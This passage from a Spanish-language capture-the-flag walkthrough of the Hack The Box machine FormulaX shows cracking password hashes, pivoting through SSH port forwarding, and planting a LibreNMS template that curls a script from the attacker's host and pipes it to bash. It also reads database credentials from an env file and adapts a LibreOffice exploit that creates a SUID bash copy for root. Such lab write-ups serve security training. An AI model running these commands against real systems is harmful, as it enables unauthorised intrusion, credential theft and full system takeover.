</span></span></span></code></pre></div><p>y trato de crackearlos a trav√©s de un <code>Brute Force Password Cracking</code> usando <code>JohnTheRipper</code> (<code>john</code>) junto con el diccionario <code>rockyou.txt</code>.</p><ul><li>Encontramos una password para el usuario <code>frank_dorky</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ john --wordlist=/usr/share/wordlists/rockyou.txt found_hashes
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Using default input encoding: UTF-8
</span></span></span><span class=line><span class=cl><span class=go>Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
</span></span></span><span class=line><span class=cl><span class=go>Cost 1 (iteration count) is 1024 for all loaded hashes
</span></span></span><span class=line><span class=cl><span class=go>Will run 5 OpenMP threads
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span></span><span class=line><span class=cl><span class=go>manchesterunited (frank_dorky)
</span></span></span><span class=line><span class=cl><span class=go>1g 0:00:13:45 1.01% (ETA: 21:46:18) 0.001210g/s 208.0p/s 211.5c/s 211.5C/s gamita..fugitiva
</span></span></span><span class=line><span class=cl><span class=go>Use the &#34;--show&#34; option to display all of the cracked passwords reliably
</span></span></span></code></pre></div><p>Tenemos credenciales: <code>frank_dorky:manchesterunited</code>.</p><ul><li>Reviso si me puedo conectar con estas credenciales a trav√©s de <code>SSH</code> con la herramienta <code>NetExec</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec ssh 10.10.11.6 -u &#39;frank_dorky&#39; -p &#39;manchesterunited&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SSH         10.10.11.6      22     10.10.11.6       [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
</span></span></span><span class=line><span class=cl><span class=go>SSH         10.10.11.6      22     10.10.11.6       [+] frank_dorky:manchesterunited  (non root) Linux - Shell access!
</span></span></span></code></pre></div><p>y funcionan.</p><ul><li>As√≠ que nos logueamos v√≠a <code>SSH</code> como el usuario <code>frank_dorky</code> y obtenemos la flag de usuario:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sshpass -p &#39;manchesterunited&#39; ssh -o stricthostkeychecking=no frank_dorky@10.10.11.6
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> * Documentation:  https://help.ubuntu.com
</span></span></span><span class=line><span class=cl><span class=go> * Management:     https://landscape.canonical.com
</span></span></span><span class=line><span class=cl><span class=go> * Support:        https://ubuntu.com/pro
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>This system has been minimized by removing packages and content that are
</span></span></span><span class=line><span class=cl><span class=go>not required on a system that users do not log into.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>To restore this content, you can run the &#39;unminimize&#39; command.
</span></span></span><span class=line><span class=cl><span class=go>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Last login: Tue Mar  5 10:19:47 2024 from 10.10.14.23
</span></span></span><span class=line><span class=cl><span class=go>frank_dorky@formulax:~$ ls
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>user.txt
</span></span></span></code></pre></div><hr><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>De los puertos internos abiertos, recuerdo que el puerto <code>3000</code> estaba expuesto:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>frank_dorky@formulax:~$ ss -ntlp | grep &#34;3000&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>LISTEN 0      511        127.0.0.1:3000       0.0.0.0:*
</span></span></span></code></pre></div><ul><li>Usando <code>cURL</code> contra nuestro <code>localhost</code> podemos ver que, en efecto, se trata de un sitio web:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>frank_dorky@formulax:~$ curl -s http://localhost:3000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;!DOCTYPE html&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;html&gt;
</span></span></span><span class=line><span class=cl><span class=go>    &lt;head&gt;
</span></span></span><span class=line><span class=cl><span class=go>        &lt;meta charset=&#34;UTF-8&#34; /&gt;
</span></span></span><span class=line><span class=cl><span class=go>        &lt;meta http-equiv=&#34;refresh&#34; content=&#34;0;url=&#39;http://localhost:3000/login&#39;&#34; /&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        &lt;title&gt;Redirecting to http://localhost:3000/login&lt;/title&gt;
</span></span></span><span class=line><span class=cl><span class=go>    &lt;/head&gt;
</span></span></span><span class=line><span class=cl><span class=go>    &lt;body&gt;
</span></span></span><span class=line><span class=cl><span class=go>        Redirecting to &lt;a href=&#34;http://localhost:3000/login&#34;&gt;http://localhost:3000/login&lt;/a&gt;.
</span></span></span><span class=line><span class=cl><span class=go>    &lt;/body&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;/html&gt;
</span></span></span></code></pre></div><ul><li>Dado que tenemos acceso por medio de <code>SSH</code>, tratar√© de performar un <code>Local Port Forwarding</code> para ganar acceso al puerto interno al cual no tenemos acceso. Para esto, convertir√© el puerto <code>3000</code> de la m√°quina v√≠ctima en el puerto <code>1234</code> de mi m√°quina de atacante. Para ello salgo de la sesi√≥n de <code>SSH</code> y me vuelvo a reloguear, pero esta vez corriendo:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sshpass -p &#39;manchesterunited&#39; ssh -o stricthostkeychecking=no -L 1234:localhost:3000 frank_dorky@10.10.11.6
</span></span></span></code></pre></div><ul><li>Ahora, en un browser de internet como <code>Firefox</code>, podemos visitar <code>http://localhost:1234</code> y ver un nuevo panel de login:</li></ul><p><img alt="FormulaX 7" src=/pentesting/images/FormulaX_7.png></p><p>el cual est√° corriendo <code>LibreNMS</code>. Googleando <code>What is LibreNMS</code> tenemos:<div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Informaci√≥n</div><div class=notice-content><code>LibreNMS</code> is a fully featured network monitoring system that provides a wealth of features and device support. <code>LibreNMS</code> can be used to monitor a wide range of features, including support for a variety of protocols, performance monitoring, alerts, and more.</div></div>En resumen, <code>LibreNMS</code> es una herramienta para monitoreo.</p><ul><li>Buscando por <code>librenms</code> en la m√°quina v√≠ctima desde nuestra sesi√≥n por <code>SSH</code> obtenemos 3 directorios:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>frank_dorky@formulax:~$ find / -name &#34;librenms&#34; 2&gt;/dev/null
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/var/lib/mysql/librenms
</span></span></span><span class=line><span class=cl><span class=go>/etc/logrotate.d/librenms
</span></span></span><span class=line><span class=cl><span class=go>/opt/librenms
</span></span></span></code></pre></div><ul><li>Si buscamos c√≥mo agregar usuarios a este servicio, encontramos <a href=https://community.librenms.org/t/adding-admin-users-on-librenms/20782 class=external-link target=_blank rel=noopener>este foro de la comunidad</a> el cual lo explica. Dentro de uno de estos directorios deber√≠a de existir un archivo <code>adduser.php</code> el cual nos permite agregar usuarios. Es as√≠ como encuentro:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>frank_dorky@formulax:/opt/librenms$ ls -la /opt/librenms/adduser.php
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-rwxr-xr-x 1 librenms librenms 956 Oct 18  2022 /opt/librenms/adduser.php
</span></span></span></code></pre></div><p>del cual tenemos permisos de ejecuci√≥n.</p><ul><li>Corriendo este archivo tenemos:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>frank_dorky@formulax:/opt/librenms$ /opt/librenms/adduser.php
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Add User Tool
</span></span></span><span class=line><span class=cl><span class=go>Usage: ./adduser.php &lt;username&gt; &lt;password&gt; &lt;level 1-10&gt; [email]
</span></span></span></code></pre></div><p>de manera que crear√© un usuario con rol <code>admin</code> llamado <code>gunzf0x</code> con nivel (level) <code>10</code> (dado que, como se explica en el post del foro, <code>10</code> significa rol de <code>admin</code>):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>frank_dorky@formulax:/opt/librenms$ /opt/librenms/adduser.php gunzf0x gunzf0x123 10 gunzf0x@gunzf0x.htb
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User gunzf0x added successfully
</span></span></span></code></pre></div><ul><li>Podemos entonces acceder al panel usando las credenciales <code>gunzf0x:gunzf0x123</code> (o con el usuario que hayamos agregado). Ahora vemos lo siguiente:</li></ul><p><img alt="FormulaX 8" src=/pentesting/images/FormulaX_8.png></p><ul><li>Yendo a <code>Gadget Symbol</code> a un costado de mi nombre de usuario, luego a <code>Validate Config</code> y yendo hacia la parte inferior de la p√°gina web, puedo ver un error:</li></ul><p><img alt="FormulaX 9" src=/pentesting/images/FormulaX_9.png></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>FAIL: server_name is set incorrectly for your webserver, update your webserver config. localhost librenms.com
</span></span></code></pre></div><ul><li>Para tratar de arreglar esto, agrego <code>librenms.com</code> temporalmente como <code>localhost</code> a mi archivo <code>/etc/hosts</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#34;127.0.0.1 librenms.com&#34; | sudo tee -a /etc/hosts
</span></span></span></code></pre></div><ul><li>Ahora, puedo visitar <code>http://librenms.com:1234</code>e ir a <code>Validate Config</code> de nuevo. Pero ahora tengo un nuevo error:</li></ul><p><img alt="FormulaX 10" src=/pentesting/images/FormulaX_10.png></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>FAIL: base_url is not set correctly
</span></span></code></pre></div><p>Luego de algunos momentos de p√°nico me di cuenta de que b√°sicamente este error se debe al puerto que hemos seleccionado al hacer el paso de <code>Local Port Forwarding</code>: La m√°quina v√≠ctima estaba corriendo <code>LibreNMS</code> en el puerto <code>3000</code>, pero yo lo configur√© en mi puerto <code>1234</code> y, en este caso, ello est√° causando un conflicto.</p><ul><li>Termino con la conexi√≥n de <code>SSH</code> con la cual hab√≠a establecido el t√∫nel, y ahora convierto mi puerto <code>3000</code> en el puerto <code>3000</code> de la m√°quina v√≠ctima.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sshpass -p &#39;manchesterunited&#39; ssh -o stricthostkeychecking=no -L 3000:localhost:3000 frank_dorky@10.10.11.6
</span></span></span></code></pre></div><ul><li>Re-visitando <code>http://librenms.com:3000/validate</code> ya no muestra errores esta vez (uff):</li></ul><p><img alt=FormulaX src=/pentesting/images/FormulaX_11.png></p><ul><li>Ahora, yendo a <code>Alert -> Alert Templates</code> nos permite crear un nuevo template. Clickeando en <code>Create new alert template</code> desplega una nueva ventana. Buscando <a href=https://docs.librenms.org/Alerting/Templates/ class=external-link target=_blank rel=noopener>c√≥mo agregar templates a LibreNMS</a> vemos que somos capaces de agregar templates usando <code>PHP</code>. Luego de una breve investigaci√≥n, descubro que <code>LibreNMS</code> usa <code>Blade</code>, un engine de templates incluido en <code>Laravel</code>. Siguiendo <a href=https://laravel.com/docs/11.x/blade#raw-php class=external-link target=_blank rel=noopener>este simple ejemplo de c√≥mo agregar templates en Blade</a> es que podemos agregar un template malicioso:</li></ul><p><img alt="FormulaX 12" src=/pentesting/images/FormulaX_12.png></p><p>de donde hemos agregado una peque√±a porci√≥n de c√≥digo <code>PHP</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>@</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>system</span><span class=p>(</span><span class=s1>&#39;curl http://10.10.16.2:8000/rev.sh|bash&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>endphp</span>
</span></span></code></pre></div><ul><li>En mi m√°quina de atacante comienzo, de nuevo, un servidor <code>Python</code> <code>HTTP</code> en el puerto <code>8000</code> donde el archivo <code>rev.sh</code> estaba localizado (el mismo archivo que hab√≠amos utilizado antes para ganar acceso inicial a la m√°quina como el usuario <code>www-data</code>), y empiezo un listener con <code>netcat</code> en el puerto <code>443</code>. Luego, clickeo en <code>Create Template</code> en la p√°gina de <code>LibreNMS</code>. Luego de realizar esto obtengo una shell como el usuario <code>librenms</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.2] from (UNKNOWN) [10.10.11.6] 52348
</span></span></span><span class=line><span class=cl><span class=go>bash: cannot set terminal process group (943): Inappropriate ioctl for device
</span></span></span><span class=line><span class=cl><span class=go>bash: no job control in this shell
</span></span></span><span class=line><span class=cl><span class=go>librenms@formulax:~$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>librenms
</span></span></span></code></pre></div><ul><li>La ventaja de este nuevo usuario es que puede leer archivos en el directorio <code>/opt/librenms</code>. All√≠ puedo ver un archivo <code>.custom.env</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>librenms@formulax:~$ ls -la /opt/librenms
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ls -la /opt/librenms
</span></span></span><span class=line><span class=cl><span class=go>total 5216
</span></span></span><span class=line><span class=cl><span class=go>drwxrwx--x   27 librenms librenms    4096 Feb 19 13:33 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x    3 root     root        4096 Feb 16 15:21 ..
</span></span></span><span class=line><span class=cl><span class=go>lrwxrwxrwx    1 root     root           9 Feb 19 13:33 .bash_history -&gt; /dev/null
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxr-x    4 librenms librenms    4096 Feb 16 15:21 .cache
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--    1 librenms librenms     815 Oct 18  2022 .codeclimate.yml
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxr-x    3 librenms librenms    4096 Feb 16 15:21 .config
</span></span></span><span class=line><span class=cl><span class=go>-rw-rw-r--    1 librenms librenms     353 Sep  7  2023 .custom.env
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--    1 librenms librenms     258 Oct 18  2022 .editorconfig
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--    1 librenms librenms      73 Oct 18  2022 .env.example
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--    1 librenms librenms     197 Oct 18  2022 .env.travis
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>librenms@formulax:~$ cat /opt/librenms/.custom.env
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>cat /opt/librenms/.custom.env
</span></span></span><span class=line><span class=cl><span class=go>APP_KEY=base64:jRoDTOFGZEO08+68w7EzYPp8a7KZCNk+4Fhh97lnCEk=
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>DB_HOST=localhost
</span></span></span><span class=line><span class=cl><span class=go>DB_DATABASE=librenms
</span></span></span><span class=line><span class=cl><span class=go>DB_USERNAME=kai_relay
</span></span></span><span class=line><span class=cl><span class=go>DB_PASSWORD=mychemicalformulaX
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span><span class=nv>APP_URL</span><span class=o>=</span>
</span></span><span class=line><span class=cl><span class=go>NODE_ID=648b260eb18d2
</span></span></span><span class=line><span class=cl><span class=go>VAPID_PUBLIC_KEY=BDhe6thQfwA7elEUvyMPh9CEtrWZM1ySaMMIaB10DsIhGeQ8Iks8kL6uLtjMsHe61-ZCC6f6XgPVt7O6liSqpvg
</span></span></span><span class=line><span class=cl><span class=go>VAPID_PRIVATE_KEY=chr9zlPVQT8NsYgDGeVFda-AiD0UWIY6OW-jStiwmTQ
</span></span></span></code></pre></div><p>de donde puedo ver un usuario y contrase√±a. De manera que tenemos nuevas credenciales para jugar <code>kai_relay:mychemicalformulaX</code>.</p><ul><li>Reviso si nos podemos loguear via <code>SSH</code> como el usuario <code>kai_relay</code> con estas credenciales:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec ssh 10.10.11.6 -u &#39;kai_relay&#39; -p &#39;mychemicalformulaX&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SSH         10.10.11.6      22     10.10.11.6       [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
</span></span></span><span class=line><span class=cl><span class=go>SSH         10.10.11.6      22     10.10.11.6       [*] Current user: &#39;kai_relay&#39; was in &#39;sudo&#39; group, please try &#39;--sudo-check&#39; to check if user can run sudo shell
</span></span></span><span class=line><span class=cl><span class=go>SSH         10.10.11.6      22     10.10.11.6       [+] kai_relay:mychemicalformulaX  (non root) Linux - Shell access!
</span></span></span></code></pre></div><p>y podemos.</p><ul><li>Nos conectamos como el usuario <code>kai_relay</code> por medio de <code>SSH</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sshpass -p &#39;mychemicalformulaX&#39; ssh -o stricthostkeychecking=no kai_relay@10.10.11.6
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> * Documentation:  https://help.ubuntu.com
</span></span></span><span class=line><span class=cl><span class=go> * Management:     https://landscape.canonical.com
</span></span></span><span class=line><span class=cl><span class=go> * Support:        https://ubuntu.com/pro
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>This system has been minimized by removing packages and content that are
</span></span></span><span class=line><span class=cl><span class=go>not required on a system that users do not log into.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>To restore this content, you can run the &#39;unminimize&#39; command.
</span></span></span><span class=line><span class=cl><span class=go>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>The programs included with the Ubuntu system are free software;
</span></span></span><span class=line><span class=cl><span class=go>the exact distribution terms for each program are described in the
</span></span></span><span class=line><span class=cl><span class=go>individual files in /usr/share/doc/*/copyright.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span></span></span><span class=line><span class=cl><span class=go>applicable law.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>The programs included with the Ubuntu system are free software;
</span></span></span><span class=line><span class=cl><span class=go>the exact distribution terms for each program are described in the
</span></span></span><span class=line><span class=cl><span class=go>individual files in /usr/share/doc/*/copyright.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span></span></span><span class=line><span class=cl><span class=go>applicable law.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>kai_relay@formulax:~$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>kai_relay
</span></span></span></code></pre></div><ul><li>Chequeando qu√© es lo que puede correr este usuario con <code>sudo</code> tenemos algo:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>kai_relay@formulax:~$ sudo -l
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Matching Defaults entries for kai_relay on forumlax:
</span></span></span><span class=line><span class=cl><span class=go>    env_reset, timestamp_timeout=0, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_reset,
</span></span></span><span class=line><span class=cl><span class=go>    timestamp_timeout=0
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User kai_relay may run the following commands on forumlax:
</span></span></span><span class=line><span class=cl><span class=go>    (ALL) NOPASSWD: /usr/bin/office.sh
</span></span></span></code></pre></div><p>Este archivo es un script en <code>Bash</code>. Leyendo qu√© es lo que hace este script, tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>kai_relay@formulax:~$ cat /usr/bin/office.sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span>!/bin/bash
</span></span><span class=line><span class=cl><span class=go>/usr/bin/soffice --calc --accept=&#34;socket,host=localhost,port=2002;urp;&#34; --norestore --nologo --nodefault --headless
</span></span></span></code></pre></div><p>donde puedo ver que est√° ejecutando el binario <code>/usr/bin/soffice</code>.</p><ul><li><p>Buscando por <code>what is soffice</code> tenemos:<div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Informaci√≥n</div><div class=notice-content>The <code>soffice.exe</code> by The Document Foundation is the executable file for the <code>LibreOffice</code> office suite. It is responsible for launching and running the various programs within the suite, such as Writer, Calc, Impress, and others</div></div>B√°sicamente, <code>soffice</code> es el ejecutable para la suite de <code>LibreOffice</code> (que es una alternativa gratuita para <code>Microsoft Excel</code>, <code>Word</code>, etc).</p><p>Lo que encontramos es que este script est√° inicializando el servicio de <code>LibreOffice</code>, usando privilegios m√°ximos (<code>root</code>). Por lo tanto, deber√≠amos de encontrar una manera de explotar este servicio.</p></li><li><p>Buscando por <code>soffice exploit</code> en Google nos lleva a <code>exploit-db</code>, m√°s espec√≠ficamente a <a href=https://www.exploit-db.com/exploits/46544 class=external-link target=_blank rel=noopener>este PoC</a>. Copio el c√≥digo, lo paso a un archivo llamado <code>/tmp/soffice_exploit.py</code> usando <code>nano</code> (o tambi√©n podemos usar <code>vi</code>), pero en lugar de ejecutar a nivel de sistema la instrucci√≥n <code>calc.exe</code> cambio la √∫ltima l√≠nea de:</p></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>shell_execute</span><span class=o>.</span><span class=n>execute</span><span class=p>(</span><span class=s2>&#34;calc.exe&#34;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span>
</span></span></code></pre></div><p>a</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>shell_execute</span><span class=o>.</span><span class=n>execute</span><span class=p>(</span><span class=s2>&#34;/bin/bash&#34;</span><span class=p>,</span> <span class=s1>&#39;/tmp/exploit.sh&#39;</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span>
</span></span></code></pre></div><p>para ejecutar un script malicioso en <code>Bash</code> script llamado <code>/tmp/exploit.sh</code>, el cual crear√© a continuaci√≥n.</p><ul><li>Nuestro script contendr√° lo siguiente:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>cp <span class=k>$(</span>which bash<span class=k>)</span> /tmp/gunzf0x <span class=p>;</span> chmod <span class=m>4755</span> /tmp/gunzf0x
</span></span></code></pre></div><p>el cual crea una copia del binario de <code>bash</code> y, a aquella copia, le otorga permisos <code>SUID</code>; lo cual nos permite correrlo con permisos del propietario (que ser√° <code>root</code>).</p><ul><li>Uso la terminal para crear el susodicho script:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>kai_relay@formulax:~$ echo -e &#39;#!/bin/bash\ncp $(which bash) /tmp/gunzf0x ; chmod 4755 /tmp/gunzf0x&#39; &gt; /tmp/exploit.sh
</span></span></span></code></pre></div><p>y le asigno permisos de ejecuci√≥n a √©ste para evitar problemas a futuro:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>kai_relay@formulax:~$ chmod +x /tmp/exploit.sh
</span></span></span></code></pre></div><ul><li>Si corremos el script basado en el PoC mencionado, √©ste nos retorna un error:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>kai_relay@formulax:~$ python3 /tmp/soffice_exploit.py --host 127.0.0.1 --port 2002
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Connecting to target...
</span></span></span><span class=line><span class=cl><span class=go>Traceback (most recent call last):
</span></span></span><span class=line><span class=cl><span class=go>  File &#34;/tmp/soffice_exploit.py&#34;, line 63, in &lt;module&gt;
</span></span></span><span class=line><span class=cl><span class=go>    context = resolver.resolve(
</span></span></span><span class=line><span class=cl><span class=go>__main__.com.sun.star.connection.NoConnectException: Connector : couldn&#39;t connect to socket (Connection refused) ./io/source/connector/connector.cxx:117
</span></span></span></code></pre></div><p>Tenemos un error de conexi√≥n.
Esto es porque el servicio de <code>LibreOffice</code> no est√° corriendo/activo en la m√°quina v√≠ctima; debemos de inicializarlo, lo cual es exactamente lo que hace el script que podemos correr con <code>sudo</code>. Por tanto, decido conectarme en otra terminal por medio de <code>SSH</code> como el usuario <code>kai_relay</code>, sin cerrar la sesi√≥n actual. En la sesi√≥n actual inicio el servicio corriendo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>kai_relay@formulax:~$ sudo /usr/bin/office.sh
</span></span></span></code></pre></div><p>y en la otra terminal, corro:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>kai_relay@formulax:~$ python3 /tmp/soffice_exploit.py --host localhost --port 2002
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Connecting to target...
</span></span></span><span class=line><span class=cl><span class=go>[+] Connected to localhost
</span></span></span></code></pre></div><ul><li>Reviso si esto ha funcionado&mldr; y nuestro archivo est√° all√≠ üíÄ:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>kai_relay@formulax:~$ ls -la /tmp
